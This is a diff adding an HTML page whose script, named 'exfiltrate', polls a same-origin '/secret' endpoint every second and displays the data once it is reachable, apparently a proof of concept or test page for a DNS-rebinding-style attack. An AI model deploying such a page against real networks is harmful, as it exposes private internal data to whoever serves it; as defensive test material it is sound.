@@ -1,0 +1,33 @@
+<html>
+<head>
+    <script type="text/javascript">
+        var Second = 1 * 1000;
+
+        var start = performance.now();
+
+        function exfiltrate() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "/secret");
+            xhr.onload = function(e) {
+                if (xhr.status == 200) {
+                    var response = xhr.responseText;
+                    var end = performance.now();
+                    document.body.innerText += "\nSuccess after " + ((end - start) / 1000).toFixed(2) + " seconds!\n";
+                    document.body.innerText += "Data: " + response;
+                } else {
+                    // retry...
+                    document.body.innerText += ".";
+                    setTimeout(exfiltrate, Second);
+                }
+            }
+            xhr.send();
+        }
+
+       setTimeout(exfiltrate, Second);
+    </script>
+</head>
+<body>
+    Please wait...<br/>
+</body>
+</html>
+
